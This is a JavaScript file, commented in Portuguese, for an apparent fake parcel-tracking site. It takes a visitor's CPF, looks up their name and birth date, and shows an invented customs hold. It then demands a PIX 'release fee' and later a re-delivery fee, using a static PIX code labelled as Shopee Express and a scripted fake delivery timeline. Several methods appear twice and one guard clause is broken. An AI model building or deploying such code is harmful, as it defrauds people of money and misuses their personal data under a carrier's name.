/**
 * Sistema principal de rastreamento - VERSÃO ATUALIZADA COM ZENTRA PAY OFICIAL
 */
import { DataService } from '../utils/data-service.js';
import { CPFValidator } from '../utils/cpf-validator.js';
import { TrackingGenerator } from '../utils/tracking-generator.js';
import { ZentraPayService } from '../services/zentra-pay.js';
import { UIHelpers } from '../utils/ui-helpers.js';

export class TrackingSystem {
    constructor() {
        this.dataService = new DataService();
        this.zentraPayService = new ZentraPayService();
        this.currentCPF = null;
        this.userData = null;
        this.trackingData = null;
        this.isInitialized = false;
        this.pixData = null;
        this.liberationPaid = false;
    }

    async init() {
        if (this.isInitialized) return;
        
        console.log('🚀 Inicializando sistema de rastreamento');
        
        try {
            this.setupCPFInput();
            this.setupTrackingForm();
            this.setupOrderDetailsAccordion();
            this.setupModalEvents();
            this.checkURLParams();
            
            this.isInitialized = true;
            console.log('✅ Sistema de rastreamento inicializado');
        } catch (error) {
            console.error('❌ Erro na inicialização:', error);
        }
    }

    showLoadingNotification() {
        const notificationOverlay = document.createElement('div');
        notificationOverlay.id = 'trackingNotification';
        notificationOverlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        const notificationContent = document.createElement('div');
        notificationContent.style.cssText = `
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `;

        notificationContent.innerHTML = `
            <div style="margin-bottom: 20px;">
                <i class="fas fa-search" style="font-size: 3rem; color: #ff6b35; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Identificando Pedido...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto rastreamos seu pacote
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #ff6b35, #f7931e); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando informações...
            </p>
        `;

        notificationOverlay.appendChild(notificationContent);
        document.body.appendChild(notificationOverlay);
        document.body.style.overflow = 'hidden';
    }

    closeLoadingNotification() {
        const notification = document.getElementById('trackingNotification');
        if (notification) {
            notification.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    showError(message) {
        const existingError = document.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }

        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.cssText = `
            background: #fee;
            color: #c33;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid #fcc;
            text-align: center;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        `;
        errorDiv.textContent = message;

        const form = document.querySelector('.tracking-form');
        if (form) {
            form.appendChild(errorDiv);

            setTimeout(() => {
                if (errorDiv.parentNode) {
                    errorDiv.style.animation = 'slideUp 0.3s ease';
                    setTimeout(() => errorDiv.remove(), 300);
                }
            }, 5000);
        }
    }

    scrollToElement(element, offset = 0) {
        if (!element) return;

        const elementPosition = element.getBoundingClientRect().top + window.pageYOffset;
        const offsetPosition = elementPosition - offset;

        window.scrollTo({
            top: offsetPosition,
            behavior: 'smooth'
        });
    }

    setupCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) return;

        cpfInput.addEventListener('input', (e) => {
            CPFValidator.applyCPFMask(e.target);
        });

        cpfInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.handleTrackingSubmit();
            }
        });
    }

    setupTrackingForm() {
        const form = document.getElementById('trackingForm');
        const button = document.getElementById('trackButton');

        if (form) {
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                this.handleTrackingSubmit();
            });
        }

        if (button) {
            button.addEventListener('click', (e) => {
                e.preventDefault();
                this.handleTrackingSubmit();
            });
        }
    }

    async handleTrackingSubmit() {
        const cpfInput = document.getElementById('cpfInput');
        const trackButton = document.getElementById('trackButton');
        
        if (!cpfInput || !trackButton) return;
            console.error('❌ Elementos do formulário não encontrados');

        const cpf = cpfInput.value.trim();
        
        if (!cpf) {
            this.showError('Por favor, digite um CPF');
            return;
        }

        if (!CPFValidator.isValidCPF(cpf)) {
            this.showError('CPF inválido. Verifique os dados digitados.');
            return;
        }

        this.currentCPF = CPFValidator.cleanCPF(cpf);
        
        trackButton.disabled = true;
        trackButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Rastreando...';

        this.showLoadingNotification();

        try {
            console.log('🔍 Buscando dados para CPF:', this.currentCPF);
            
            const data = await this.dataService.fetchCPFData(this.currentCPF);
            console.log('📊 Dados recebidos:', data);
            
            if (data && data.DADOS) {
                this.userData = {
                    nome: data.DADOS.nome,
                    cpf: this.currentCPF,
                    nascimento: data.DADOS.data_nascimento,
                    situacao: 'REGULAR'
                };

                console.log('✅ Dados obtidos:', this.userData);
                
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                this.closeLoadingNotification();
                
                this.displayOrderDetails();
                this.generateTrackingData();
                this.displayTrackingResults();
                
                const orderDetails = document.getElementById('orderDetails');
                if (orderDetails) {
                    this.scrollToElement(orderDetails, 100);
                }

                setTimeout(() => {
                    this.highlightLiberationButton();
                }, 1500);
                
            } else {
                throw new Error('Dados não encontrados');
            }
            
        } catch (error) {
            console.error('❌ Erro no rastreamento:', error);
            this.closeLoadingNotification();
            this.showError('Erro ao buscar dados. Tente novamente.');
        } finally {
            trackButton.disabled = false;
            trackButton.innerHTML = '<i class="fas fa-search"></i> Rastrear Pacote';
        }
    }

    displayOrderDetails() {
        if (!this.userData) return;

        const orderDetails = document.getElementById('orderDetails');
        const customerName = document.getElementById('customerName');
        const fullName = document.getElementById('fullName');
        const formattedCpf = document.getElementById('formattedCpf');

        if (orderDetails) {
            orderDetails.style.display = 'block';
        }

        if (customerName) {
            customerName.textContent = this.userData.nome.split(' ')[0];
        }

        if (fullName) {
            fullName.textContent = this.userData.nome;
        }

        if (formattedCpf) {
            formattedCpf.textContent = CPFValidator.formatCPF(this.userData.cpf);
        }
    }

    generateTrackingData() {
        this.trackingData = TrackingGenerator.generateTrackingData(this.userData);
    }

    displayTrackingResults() {
        const trackingResults = document.getElementById('trackingResults');
        const customerNameStatus = document.getElementById('customerNameStatus');
        const currentStatus = document.getElementById('currentStatus');
        const trackingTimeline = document.getElementById('trackingTimeline');

        if (trackingResults) {
            trackingResults.style.display = 'block';
        }

        if (customerNameStatus) {
            customerNameStatus.textContent = this.userData.nome.split(' ')[0];
        }

        if (currentStatus) {
            currentStatus.textContent = 'Aguardando liberação aduaneira';
        }

        if (trackingTimeline) {
            this.renderTimeline(trackingTimeline);
        }

        setTimeout(() => {
            UIHelpers.animateTimeline();
        }, 500);
    }

    renderTimeline(container) {
        container.innerHTML = '';

        this.trackingData.steps.forEach((step, index) => {
            const timelineItem = this.createTimelineItem(step, index);
            container.appendChild(timelineItem);
        });
    }

    createTimelineItem(step, index) {
        const item = document.createElement('div');
        item.className = `timeline-item ${step.completed ? 'completed' : ''}`;
        
        if (index === 0) {
            item.classList.add('first');
        }

        const dateFormatted = step.date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeFormatted = step.date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        let buttonHtml = '';
        if (step.needsLiberation) {
            buttonHtml = `
                <button class="liberation-button-timeline" data-liberation-button>
                    <i class="fas fa-unlock"></i> LIBERAR OBJETO
                </button>
            `;
        }

        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateFormatted}</span>
                    <span class="time">${timeFormatted}</span>
                </div>
                <div class="timeline-text">
                    <p>
                        ${step.isChina ? '<span class="china-tag">[China]</span>' : ''}
                        ${step.description}
                    </p>
                    ${buttonHtml}
                </div>
            </div>
        `;

        return item;
    }

    highlightLiberationButton() {
        // Não destacar se já foi pago
        if (this.liberationPaid) {
            console.log('💰 Liberação já paga, não destacando botão');
            return;
        }
        
        // Buscar botões usando múltiplos seletores
        const selectors = [
            '[data-liberation-button]',
            '.liberation-button-timeline'
        ];

        let liberationButton = null;

        for (const selector of selectors) {
            liberationButton = document.querySelector(selector);
            if (liberationButton) break;
        }

        // Fallback: buscar por texto
        if (!liberationButton) {
            const allButtons = Array.from(document.querySelectorAll('button'));
            liberationButton = allButtons.find(btn => 
                btn.textContent && btn.textContent.includes('LIBERAR')
            );
        }

        if (liberationButton) {
            console.log('🔓 Botão de liberação encontrado');
            
            this.setupLiberationButton(liberationButton);
            
            setTimeout(() => {
                this.scrollToElement(liberationButton, 100);
            }, 500);
        } else {
            console.warn('⚠️ Botão de liberação não encontrado');
            console.log('🔍 Tentando criar botão de liberação...');
            this.createLiberationButtonIfMissing();
        }
    }

    createLiberationButtonIfMissing() {
        // Verificar se já existe um botão na última etapa da timeline
        const timelineItems = document.querySelectorAll('.timeline-item');
        const lastTimelineItem = timelineItems[timelineItems.length - 1];
        
        if (lastTimelineItem && !lastTimelineItem.querySelector('[data-liberation-button]')) {
            const timelineText = lastTimelineItem.querySelector('.timeline-text');
            if (timelineText) {
                const liberationButton = document.createElement('button');
                liberationButton.className = 'liberation-button-timeline';
                liberationButton.setAttribute('data-liberation-button', 'true');
                liberationButton.innerHTML = '<i class="fas fa-unlock"></i> LIBERAR OBJETO';
                
                timelineText.appendChild(liberationButton);
                this.setupLiberationButton(liberationButton);
                
                console.log('✅ Botão de liberação criado automaticamente');
            }
        }
    }

    setupLiberationButton(button) {
        button.addEventListener('click', () => {
            this.showLiberationModal();
        });

        button.style.animation = 'pulse 2s infinite';
        button.style.boxShadow = '0 0 20px rgba(255, 107, 53, 0.6)';
    }

    async showLiberationModal() {
        console.log('🔓 Abrindo modal de liberação');
        
        const modal = document.getElementById('liberationModal');
        if (!modal) {
            console.error('❌ Modal de liberação não encontrado');
            return;
        }

        // ⚡ ABRIR MODAL IMEDIATAMENTE
        console.log('⚡ Abrindo modal instantaneamente...');
        modal.style.display = 'flex';
        document.body.style.overflow = 'hidden';

        // 🔄 GERAR PIX EM BACKGROUND (sem bloquear a UI)
        this.generatePixInBackground();
    }

    async generatePixInBackground() {
        console.log('🔄 Gerando PIX em background...');
        
        // Mostrar loading inicial
        this.showPixLoadingState();
        
        try {
            console.log('🚀 Chamando Zentra Pay...');
            
            const pixResult = await this.zentraPayService.createPixTransaction(
                this.userData, 
                26.34
            );

            if (pixResult.success) {
                console.log('🎉 PIX gerado com sucesso!');
                this.pixData = pixResult;
                this.updateModalWithRealPix();
            } else {
                console.warn('⚠️ Erro ao gerar PIX, usando estático');
                this.updateModalWithStaticPix();
            }
            
        } catch (error) {
            console.error('💥 Erro ao gerar PIX:', error);
            this.updateModalWithStaticPix();
        }
    }

    showPixLoadingState() {
        const qrCodeImg = document.getElementById('realPixQrCode');
        const pixCodeTextarea = document.getElementById('pixCodeModal');
        const copyButton = document.getElementById('copyPixButtonModal');

        if (qrCodeImg) {
            // QR Code de loading
            qrCodeImg.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgdmlld0JveD0iMCAwIDIwMCAyMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIiBmaWxsPSIjZjhmOWZhIi8+CjxjaXJjbGUgY3g9IjEwMCIgY3k9IjEwMCIgcj0iMjAiIGZpbGw9IiNmZjZiMzUiPgogIDxhbmltYXRlVHJhbnNmb3JtIGF0dHJpYnV0ZU5hbWU9InRyYW5zZm9ybSIgYXR0cmlidXRlVHlwZT0iWE1MIiB0eXBlPSJyb3RhdGUiIGZyb209IjAgMTAwIDEwMCIgdG89IjM2MCAxMDAgMTAwIiBkdXI9IjFzIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIvPgo8L2NpcmNsZT4KPHRleHQgeD0iMTAwIiB5PSIxNDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiM2NjYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMiI+Q2FycmVnYW5kby4uLjwvdGV4dD4KPC9zdmc+';
            qrCodeImg.alt = 'Carregando QR Code...';
        }

        if (pixCodeTextarea) {
            pixCodeTextarea.value = 'Gerando código PIX...';
            pixCodeTextarea.style.color = '#999';
            pixCodeTextarea.style.fontStyle = 'italic';
        }

        if (copyButton) {
            copyButton.disabled = true;
            copyButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gerando...';
            copyButton.style.opacity = '0.7';
        }
    }

    updateModalWithRealPix() {
        const qrCodeImg = document.getElementById('realPixQrCode');
        const pixCodeTextarea = document.getElementById('pixCodeModal');
        const copyButton = document.getElementById('copyPixButtonModal');

        if (qrCodeImg && this.pixData.pixPayload) {
            qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`;
            qrCodeImg.alt = 'QR Code PIX Real - Zentra Pay Oficial';
        }

        if (pixCodeTextarea && this.pixData.pixPayload) {
            pixCodeTextarea.value = this.pixData.pixPayload;
            pixCodeTextarea.style.color = '';
            pixCodeTextarea.style.fontStyle = '';
        }

        if (copyButton) {
            copyButton.disabled = false;
            copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar';
            copyButton.style.opacity = '';
        }

        console.log('✅ Modal atualizado com PIX real');
    }

    updateModalWithStaticPix() {
        const qrCodeImg = document.getElementById('realPixQrCode');
        const pixCodeTextarea = document.getElementById('pixCodeModal');
        const copyButton = document.getElementById('copyPixButtonModal');
        const staticPix = '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';

        if (qrCodeImg) {
            qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(staticPix)}`;
            qrCodeImg.alt = 'QR Code PIX';
        }

        if (pixCodeTextarea) {
            pixCodeTextarea.value = staticPix;
            pixCodeTextarea.style.color = '';
            pixCodeTextarea.style.fontStyle = '';
        }

        if (copyButton) {
            copyButton.disabled = false;
            copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar';
            copyButton.style.opacity = '';
        }

        console.log('⚠️ Modal atualizado com PIX estático');
    }

    setupOrderDetailsAccordion() {
        const detailsHeader = document.getElementById('detailsHeader');
        const detailsContent = document.getElementById('detailsContent');
        const toggleIcon = document.querySelector('.toggle-icon');

        if (detailsHeader && detailsContent) {
            detailsHeader.addEventListener('click', () => {
                const isExpanded = detailsContent.classList.contains('expanded');
                
                if (isExpanded) {
                    detailsContent.classList.remove('expanded');
                    if (toggleIcon) toggleIcon.classList.remove('rotated');
                } else {
                    detailsContent.classList.add('expanded');
                    if (toggleIcon) toggleIcon.classList.add('rotated');
                }
            });
        }
    }

    setupModalEvents() {
        // Modal de liberação
        const closeModal = document.getElementById('closeModal');
        const copyPixButton = document.getElementById('copyPixButtonModal');
        const simulatePaymentButton = document.getElementById('simulatePaymentButton');
        const liberationModal = document.getElementById('liberationModal');

        if (closeModal) {
            closeModal.addEventListener('click', () => {
                this.closeLiberationModal();
            });
        }

        if (copyPixButton) {
            copyPixButton.addEventListener('click', () => {
                this.copyPixCode();
            });
        }

        if (simulatePaymentButton) {
            simulatePaymentButton.addEventListener('click', () => {
                this.simulatePayment();
            });
        }

        if (liberationModal) {
            liberationModal.addEventListener('click', (e) => {
                if (e.target === liberationModal) {
                    this.closeLiberationModal();
                }
            });
        }
    }

    simulatePayment() {
        console.log('🎭 Simulando pagamento realizado');
        
        // Fechar modal atual
        this.closeLiberationModal();
        
        // Mostrar notificação de sucesso
        this.showPaymentSuccessNotification();
        
        // Atualizar timeline após 2 segundos
        setTimeout(() => {
            this.addPaymentSuccessStep();
            this.startPostLiberationFlow();
        }, 2000);
    }
    
    showPaymentSuccessNotification() {
        const notification = document.createElement('div');
        notification.id = 'paymentSuccessNotification';
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(45deg, #27ae60, #2ecc71);
            color: white;
            padding: 20px 25px;
            border-radius: 12px;
            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.4);
            z-index: 3000;
            animation: slideInRight 0.5s ease;
            font-family: Inter, sans-serif;
            max-width: 350px;
        `;
        
        notification.innerHTML = `
            <div style="display: flex; align-items: center; gap: 12px;">
                <i class="fas fa-check-circle" style="font-size: 24px;"></i>
                <div>
                    <div style="font-weight: 700; font-size: 16px; margin-bottom: 4px;">
                        Pagamento Confirmado!
                    </div>
                    <div style="font-size: 14px; opacity: 0.9;">
                        Taxa de liberação paga com sucesso
                    </div>
                </div>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        // Remover após 4 segundos
        setTimeout(() => {
            if (notification.parentNode) {
                notification.style.animation = 'slideOutRight 0.5s ease';
                setTimeout(() => notification.remove(), 500);
            }
        }, 4000);
        
        // Adicionar animações CSS se não existirem
        if (!document.getElementById('paymentAnimations')) {
            const style = document.createElement('style');
            style.id = 'paymentAnimations';
            style.textContent = `
                @keyframes slideInRight {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes slideOutRight {
                    from { transform: translateX(0); opacity: 1; }
                    to { transform: translateX(100%); opacity: 0; }
                }
            `;
            document.head.appendChild(style);
        }
    }
    
    addPaymentSuccessStep() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;
        
        const successStep = this.createTimelineItem({
            date: new Date(),
            description: 'Taxa de liberação aduaneira paga com sucesso',
            completed: true
        }, 999);
        
        // Adicionar classe especial para destaque
        successStep.classList.add('payment-success');
        successStep.style.cssText += `
            background: linear-gradient(135deg, #d4edda, #c3e6cb);
            border-radius: 10px;
            padding: 15px;
            margin: 10px 0;
            border: 2px solid #27ae60;
        `;
        
        timeline.appendChild(successStep);
        
        // Animar entrada
        setTimeout(() => {
            successStep.style.opacity = '1';
            successStep.style.transform = 'translateY(0)';
        }, 100);
        
        // Scroll para o novo item
        successStep.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
    
    startPostLiberationFlow() {
        console.log('🚀 Iniciando fluxo pós-liberação');
        
        // Etapa 1: Pedido liberado na alfândega (imediato)
        setTimeout(() => {
            this.addTimelineStep('Pedido liberado na alfândega', 'Seu pedido foi liberado após o pagamento da taxa alfandegária');
        }, 3000);
        
        // Etapa 2: Pedido sairá para entrega (após 6 segundos)
        setTimeout(() => {
            this.addTimelineStep('Pedido sairá para entrega', 'Pedido sairá para entrega para seu endereço');
        }, 6000);
        
        // Etapa 3: Pedido em trânsito (após 9 segundos)
        setTimeout(() => {
            this.addTimelineStep('Pedido em trânsito', 'Pedido em trânsito para seu endereço');
        }, 9000);
        
        // Etapa 4: Pedido em rota de entrega (após 12 segundos)
        setTimeout(() => {
            this.addTimelineStep('Pedido em rota de entrega', 'Pedido em rota de entrega para seu endereço, aguarde');
        }, 12000);
        
        // Etapa 5: Tentativa de entrega (após 15 segundos)
        setTimeout(() => {
            this.addTimelineStep('Tentativa de entrega', '1ª tentativa de entrega realizada, mas não foi possível entregar', true);
        }, 15000);
    }
    
    addTimelineStep(title, description, isDeliveryAttempt = false) {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;
        
        const newStep = this.createTimelineItem({
            date: new Date(),
            description: description,
            completed: true,
            isDeliveryAttempt: isDeliveryAttempt
        }, Date.now());
        
        // Se for tentativa de entrega, adicionar botão de reenvio
        if (isDeliveryAttempt) {
            const buttonHtml = `
                <button class="delivery-retry-btn" style="
                    background: linear-gradient(45deg, #ff6b35, #f7931e);
                    color: white;
                    border: none;
                    padding: 12px 25px;
                    font-size: 1rem;
                    font-weight: 700;
                    border-radius: 25px;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
                    animation: pulse 2s infinite;
                    font-family: Roboto, sans-serif;
                    letter-spacing: 0.5px;
                    margin-top: 15px;
                    display: inline-flex;
                    align-items: center;
                    gap: 8px;
                ">
                    <i class="fas fa-redo"></i> Reenviar Pacote
                </button>
            `;
            
            const timelineText = newStep.querySelector('.timeline-text');
            if (timelineText) {
                timelineText.innerHTML += buttonHtml;
                
                // Configurar evento do botão de reenvio
                const retryButton = timelineText.querySelector('.delivery-retry-btn');
                if (retryButton) {
                    retryButton.addEventListener('click', () => {
                        this.showDeliveryRetryModal();
                    });
                }
            }
        }
        
        timeline.appendChild(newStep);
        
        // Animar entrada
        setTimeout(() => {
            newStep.style.opacity = '1';
            newStep.style.transform = 'translateY(0)';
        }, 100);
        
        // Scroll para o novo item
        newStep.scrollIntoView({ behavior: 'smooth', block: 'center' });
        
        console.log(`✅ Nova etapa adicionada: ${title}`);
    }
    
    showDeliveryRetryModal() {
        // Implementar modal de reenvio similar ao de liberação
        console.log('🚚 Abrindo modal de reenvio de entrega');
        
        // Por enquanto, apenas log - pode ser expandido depois
        alert('Modal de reenvio de entrega - R$ 7,74\n\nEsta funcionalidade pode ser expandida conforme necessário.');
    }

    closeLiberationModal() {
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    copyPixCode() {
        const pixInput = document.getElementById('pixCodeModal');
        const copyButton = document.getElementById('copyPixButtonModal');
        
        if (!pixInput || !copyButton) return;

        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    console.log('✅ PIX copiado:', pixInput.value.substring(0, 50) + '...');
                    this.showCopySuccess(copyButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
        }
    }

    fallbackCopy(input, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                console.log('✅ PIX copiado via execCommand');
                this.showCopySuccess(button);
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
        }
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    simulatePayment() {
        console.log('🎭 Simulando pagamento realizado');
        
        // Fechar modal atual
        this.closeLiberationModal();
        
        // Mostrar notificação de sucesso
        this.showPaymentSuccessNotification();
        
        // Atualizar timeline após 2 segundos
        setTimeout(() => {
            this.addPaymentSuccessStep();
            this.startPostLiberationFlow();
        }, 2000);
    }
    
    showPaymentSuccessNotification() {
        const notification = document.createElement('div');
        notification.id = 'paymentSuccessNotification';
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(45deg, #27ae60, #2ecc71);
            color: white;
            padding: 20px 25px;
            border-radius: 12px;
            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.4);
            z-index: 3000;
            animation: slideInRight 0.5s ease;
            font-family: Inter, sans-serif;
            max-width: 350px;
        `;
        
        notification.innerHTML = `
            <div style="display: flex; align-items: center; gap: 12px;">
                <i class="fas fa-check-circle" style="font-size: 24px;"></i>
                <div>
                    <div style="font-weight: 700; font-size: 16px; margin-bottom: 4px;">
                        Pagamento Confirmado!
                    </div>
                    <div style="font-size: 14px; opacity: 0.9;">
                        Taxa de liberação paga com sucesso
                    </div>
                </div>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        // Remover após 4 segundos
        setTimeout(() => {
            if (notification.parentNode) {
                notification.style.animation = 'slideOutRight 0.5s ease';
                setTimeout(() => notification.remove(), 500);
            }
        }, 4000);
        
        // Adicionar animações CSS se não existirem
        if (!document.getElementById('paymentAnimations')) {
            const style = document.createElement('style');
            style.id = 'paymentAnimations';
            style.textContent = `
                @keyframes slideInRight {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes slideOutRight {
                    from { transform: translateX(0); opacity: 1; }
                    to { transform: translateX(100%); opacity: 0; }
                }
            `;
            document.head.appendChild(style);
        }
    }
    
    addPaymentSuccessStep() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;
        
        const successStep = this.createTimelineItem({
            date: new Date(),
            description: 'Taxa de liberação aduaneira paga com sucesso',
            completed: true
        }, 999);
        
        // Adicionar classe especial para destaque
        successStep.classList.add('payment-success');
        successStep.style.cssText += `
            background: linear-gradient(135deg, #d4edda, #c3e6cb);
            border-radius: 10px;
            padding: 15px;
            margin: 10px 0;
            border: 2px solid #27ae60;
        `;
        
        timeline.appendChild(successStep);
        
        // Animar entrada
        setTimeout(() => {
            successStep.style.opacity = '1';
            successStep.style.transform = 'translateY(0)';
        }, 100);
        
        // Scroll para o novo item
        successStep.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
    
    startPostLiberationFlow() {
        console.log('🚀 Iniciando fluxo pós-liberação');
        
        // Aqui você pode adicionar as próximas etapas do processo
        // Por exemplo: "Pedido liberado", "Saindo para entrega", etc.
        
        setTimeout(() => {
            this.addTimelineStep('Pedido liberado na alfândega', 'Seu pedido foi liberado e seguirá para entrega');
        }, 3000);
        
        setTimeout(() => {
            this.addTimelineStep('Preparando para entrega', 'Pedido sendo preparado para sair para entrega');
        }, 6000);
    }
    
    addTimelineStep(title, description) {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;
        
        const newStep = this.createTimelineItem({
            date: new Date(),
            description: description,
            completed: true
        }, Date.now());
        
        timeline.appendChild(newStep);
        
        // Animar entrada
        setTimeout(() => {
            newStep.style.opacity = '1';
            newStep.style.transform = 'translateY(0)';
        }, 100);
        
        // Scroll para o novo item
        newStep.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }

    checkURLParams() {
        const urlParams = new URLSearchParams(window.location.search);
        const focusCpf = urlParams.get('focus');
        
        if (focusCpf === 'cpf') {
            setTimeout(() => {
                const cpfInput = document.getElementById('cpfInput');
                if (cpfInput) {
                    cpfInput.focus();
                }
            }, 500);
        }
    }

    setZentraPayApiSecret(apiSecret) {
        if (this.zentraPayService) {
            this.zentraPayService.setApiSecret(apiSecret);
        }
    }
}